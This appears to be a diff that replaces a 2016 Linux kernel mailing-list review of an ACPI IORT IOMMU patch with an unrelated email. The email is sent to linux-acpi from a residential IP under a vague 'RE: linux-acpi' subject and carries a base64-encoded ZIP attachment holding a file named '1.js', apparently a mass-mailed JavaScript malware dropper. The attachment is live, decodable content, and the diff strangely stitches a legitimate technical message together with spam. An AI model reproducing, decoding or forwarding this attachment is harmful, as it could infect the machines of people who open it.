@@ -1,255 +1,59 @@
-From: nwatters-sgV2jX0FEOL9JmXXK+q4OQ@public.gmane.org
-Subject: Re: [RFC PATCH v3 13/13] drivers: acpi: iort: introduce
-	iort_iommu_configure
-Date: Wed, 03 Aug 2016 10:19:43 -0400
-Message-ID: <016fb1080595ef61ec7a91da15ef2430@codeaurora.org>
-References: <1469013815-24380-1-git-send-email-lorenzo.pieralisi@arm.com>
-	<1469013815-24380-14-git-send-email-lorenzo.pieralisi@arm.com>
+From: <x9ahoukatsu@med.kagawa-u.ac.jp>
+Subject: RE: linux-acpi
+Date: Wed, 3 Aug 2016 10:24:17 -0400
+Message-ID: <000101d1edc4$e3f77420$c0a80001@verizon.net>
+Reply-To: <linux-acpi@vger.kernel.org>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="us-ascii"; Format="flowed"
-Content-Transfer-Encoding: 7bit
-Return-path: <iommu-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-In-Reply-To: <1469013815-24380-14-git-send-email-lorenzo.pieralisi-5wv7dgnIgG8@public.gmane.org>
-List-Unsubscribe: <https://lists.linuxfoundation.org/mailman/options/iommu>,
-	<mailto:iommu-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=unsubscribe>
-List-Archive: <http://lists.linuxfoundation.org/pipermail/iommu/>
-List-Post: <mailto:iommu-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-List-Help: <mailto:iommu-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=help>
-List-Subscribe: <https://lists.linuxfoundation.org/mailman/listinfo/iommu>,
-	<mailto:iommu-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=subscribe>
-Sender: iommu-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-Errors-To: iommu-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-To: Lorenzo Pieralisi <lorenzo.pieralisi-5wv7dgnIgG8@public.gmane.org>
-Cc: linux-arm-kernel-IAPFreCvJWM7uuMidbF8XUB+6BGkLq7r@public.gmane.org, Marc Zyngier <marc.zyngier-5wv7dgnIgG8@public.gmane.org>, Tomasz Nowicki <tn-nYOzD4b6Jr9Wk0Htik3J/w@public.gmane.org>, "Rafael J. Wysocki" <rjw-LthD3rsA81gm4RdzfppkhA@public.gmane.org>, linux-kernel-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, Will Deacon <will.deacon-5wv7dgnIgG8@public.gmane.org>, Sinan Kaya <okaya-sgV2jX0FEOL9JmXXK+q4OQ@public.gmane.org>, linux-acpi-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, iommu-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org, Hanjun Guo <hanjun.guo-QSEj5FYQhm4dnm+yROfE0A@public.gmane.org>, linux-pci-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, Jon Masters <jcm-H+wXaHxf7aLQT0dZR+AlfA@public.gmane.org>
+Content-Type: application/zip; name="zgkfyihl_linux-acpi.zip"
+Content-Transfer-Encoding: base64
+Return-path: <linux-acpi-owner@vger.kernel.org>
+Received: from static-173-59-115-46.phlapa.fios.verizon.net ([173.59.115.46]:49698
+	"HELO verizon.net" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org
+	with SMTP id S932195AbcHCOYR (ORCPT
+	<rfc822;linux-acpi@vger.kernel.org>); Wed, 3 Aug 2016 10:24:17 -0400
+Content-Disposition: attachment
+Sender: linux-acpi-owner@vger.kernel.org
 List-Id: linux-acpi@vger.kernel.org
+To: linux-acpi <linux-acpi@vger.kernel.org>
 
-On 2016-07-20 07:23, Lorenzo Pieralisi wrote:
-> DT based systems have a generic kernel API to configure IOMMUs
-> for devices (ie of_iommu_configure()).
-> 
-> On ARM based ACPI systems, the of_iommu_configure() equivalent can
-> be implemented atop ACPI IORT kernel API, with the corresponding
-> functions to map device identifiers to IOMMUs and retrieve the
-> corresponding IOMMU operations necessary for DMA operations set-up.
-> 
-> By relying on the iommu_fwspec generic kernel infrastructure,
-> implement the IORT based IOMMU configuration for ARM ACPI systems
-> and hook it up in the ACPI kernel layer that implements DMA
-> configuration for a device.
-> 
-> Signed-off-by: Lorenzo Pieralisi <lorenzo.pieralisi-5wv7dgnIgG8@public.gmane.org>
-> Cc: Hanjun Guo <hanjun.guo-QSEj5FYQhm4dnm+yROfE0A@public.gmane.org>
-> Cc: Tomasz Nowicki <tn-nYOzD4b6Jr9Wk0Htik3J/w@public.gmane.org>
-> Cc: "Rafael J. Wysocki" <rjw-LthD3rsA81gm4RdzfppkhA@public.gmane.org>
-> ---
->  drivers/acpi/iort.c  | 64 
-> ++++++++++++++++++++++++++++++++++++++++++++++++++++
->  drivers/acpi/scan.c  |  7 +++++-
->  include/linux/iort.h |  4 ++++
->  3 files changed, 74 insertions(+), 1 deletion(-)
-> 
-> diff --git a/drivers/acpi/iort.c b/drivers/acpi/iort.c
-> index c116b68..a12a4ff 100644
-> --- a/drivers/acpi/iort.c
-> +++ b/drivers/acpi/iort.c
-> @@ -18,6 +18,7 @@
-> 
->  #define pr_fmt(fmt)	"ACPI: IORT: " fmt
-> 
-> +#include <linux/iommu-fwspec.h>
->  #include <linux/iort.h>
->  #include <linux/kernel.h>
->  #include <linux/list.h>
-> @@ -27,6 +28,8 @@
-> 
->  #define IORT_TYPE_MASK(type)	(1 << (type))
->  #define IORT_MSI_TYPE		(1 << ACPI_IORT_NODE_ITS_GROUP)
-> +#define IORT_IOMMU_TYPE		((1 << ACPI_IORT_NODE_SMMU) |	\
-> +				(1 << ACPI_IORT_NODE_SMMU_V3))
-> 
->  struct iort_its_msi_chip {
->  	struct list_head	list;
-> @@ -458,6 +461,67 @@ iort_get_device_domain(struct device *dev, u32 
-> req_id)
->  	return irq_find_matching_fwnode(handle, DOMAIN_BUS_PCI_MSI);
->  }
-> 
-> +static int __get_pci_rid(struct pci_dev *pdev, u16 alias, void *data)
-> +{
-> +	u32 *rid = data;
-> +
-> +	*rid = alias;
-> +	return 0;
-> +}
-> +
-> +static int arm_smmu_iort_xlate(struct device *dev, u32 streamid,
-> +			       struct fwnode_handle *fwnode)
-> +{
-> +	int ret = iommu_fwspec_init(dev, fwnode);
-> +
-> +	if (!ret)
-> +		ret = iommu_fwspec_add_ids(dev, &streamid, 1);
-> +
-> +	return 0;
-
-Are you intentionally returning 0 instead of ret? How about doing this 
-instead?
-
-	return ret ? ret : iommu_fwspec_add_ids(dev, &streamid, 1);
-
-> +}
-> +
-> +/**
-> + * iort_iommu_configure - Set-up IOMMU configuration for a device.
-> + *
-> + * @dev: device to configure
-> + *
-> + * Returns: iommu_ops pointer on configuration success
-> + *          NULL on configuration failure
-> + */
-> +const struct iommu_ops *iort_iommu_configure(struct device *dev)
-> +{
-> +	struct acpi_iort_node *node, *parent;
-> +	struct fwnode_handle *iort_fwnode;
-> +	u32 rid = 0, devid = 0;
-
-Since this routine maps the RID space of a device to the StreamID space 
-of its
-parent smmu, would you consider renaming the devid variable to some form 
-of sid
-or streamid?
-
-> +
-> +	if (dev_is_pci(dev)) {
-> +		struct pci_bus *bus = to_pci_dev(dev)->bus;
-> +
-> +		pci_for_each_dma_alias(to_pci_dev(dev), __get_pci_rid,
-> +				       &rid);
-> +
-> +		node = iort_scan_node(ACPI_IORT_NODE_PCI_ROOT_COMPLEX,
-> +				      iort_match_node_callback, &bus->dev);
-> +	} else {
-> +		node = iort_scan_node(ACPI_IORT_NODE_NAMED_COMPONENT,
-> +				      iort_match_node_callback, dev);
-> +	}
-> +
-> +	if (!node)
-> +		return NULL;
-> +
-> +	parent = iort_node_map_rid(node, rid, &devid, IORT_IOMMU_TYPE);
-> +	if (parent) {
-> +		iort_fwnode = iort_get_fwnode(parent);
-> +		if (iort_fwnode) {
-> +			arm_smmu_iort_xlate(dev, devid, iort_fwnode);
-
-What about named components with multiple stream ids? Since establishing 
-the
-relationship between a named component and its parent smmu is already 
-dependent
-on there being an appropriate mapping of rid 0, it stands to reason that 
-all of
-the stream ids for a named component could be enumerated by mapping 
-increasing
-rid values until the output parent no longer matches that returned for 
-rid 0.
-
-> +			return fwspec_iommu_get_ops(iort_fwnode);
-> +		}
-> +	}
-> +
-> +	return NULL;
-> +}
-
-It should be noted that while trying out the approach described above, I 
-noticed
-that each of the smmu attached named components described in my iort 
-were ending
-up with an extra stream id. The culprit appears to be that the range 
-checking in
-iort_id_map() is overly permissive on the upper bounds. For example, 
-mappings
-with input_base=N and id_count=1 were matching both N and N+1. The 
-following
-change fixed the issue.
-
-@@ -296,7 +296,7 @@ iort_id_map(struct acpi_iort_id_mapping *map, u8 
-type, u32 rid_in, u32 *rid_out)
-         }
-
-         if (rid_in < map->input_base ||
--           (rid_in > map->input_base + map->id_count))
-+           (rid_in >= map->input_base + map->id_count))
-                 return -ENXIO;
-
-         *rid_out = map->output_base + (rid_in - map->input_base);
-
-> +
->  static void acpi_smmu_v3_register_irq(int hwirq, const char *name,
->  				      struct resource *res)
->  {
-> diff --git a/drivers/acpi/scan.c b/drivers/acpi/scan.c
-> index b4b9064..de28825 100644
-> --- a/drivers/acpi/scan.c
-> +++ b/drivers/acpi/scan.c
-> @@ -7,6 +7,7 @@
->  #include <linux/slab.h>
->  #include <linux/kernel.h>
->  #include <linux/acpi.h>
-> +#include <linux/iort.h>
->  #include <linux/signal.h>
->  #include <linux/kthread.h>
->  #include <linux/dmi.h>
-> @@ -1365,11 +1366,15 @@ enum dev_dma_attr acpi_get_dma_attr(struct
-> acpi_device *adev)
->   */
->  void acpi_dma_configure(struct device *dev, enum dev_dma_attr attr)
->  {
-> +	const struct iommu_ops *iommu;
-> +
-> +	iommu = iort_iommu_configure(dev);
-> +
->  	/*
->  	 * Assume dma valid range starts at 0 and covers the whole
->  	 * coherent_dma_mask.
->  	 */
-> -	arch_setup_dma_ops(dev, 0, dev->coherent_dma_mask + 1, NULL,
-> +	arch_setup_dma_ops(dev, 0, dev->coherent_dma_mask + 1, iommu,
->  			   attr == DEV_DMA_COHERENT);
-
-If dev has a matching named component iort entry with a non-zero value 
-for
-memory_address_limit, why not use that as the size input to 
-arch_setup_dma_ops?
-
->  }
-> 
-> diff --git a/include/linux/iort.h b/include/linux/iort.h
-> index 18e6836..bbe08ef 100644
-> --- a/include/linux/iort.h
-> +++ b/include/linux/iort.h
-> @@ -34,6 +34,8 @@ struct irq_domain *iort_get_device_domain(struct
-> device *dev, u32 req_id);
->  /* IOMMU interface */
->  int iort_add_smmu_platform_device(struct fwnode_handle *fwnode,
->  				  struct acpi_iort_node *node);
-> +
-> +const struct iommu_ops *iort_iommu_configure(struct device *dev);
->  #else
->  static inline bool iort_node_match(u8 type) { return false; }
->  static inline void iort_table_detect(void) { }
-> @@ -48,6 +50,8 @@ iort_add_smmu_platform_device(struct fwnode_handle 
-> *fwnode,
->  {
->  	return -ENODEV;
->  }
-> +static inline const struct iommu_ops *
-> +iort_iommu_configure(struct device *dev) { return NULL; }
->  #endif
-> 
->  #define IORT_ACPI_DECLARE(name, table_id, fn)		\
-
--- 
-Qualcomm Datacenter Technologies, Inc. on behalf of Qualcomm 
-Technologies, Inc.
-Qualcomm Technologies, Inc. is a member of the Code Aurora Forum, a 
-Linux Foundation Collaborative Project.
+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
+AQBWAAAAiAgAAAAA
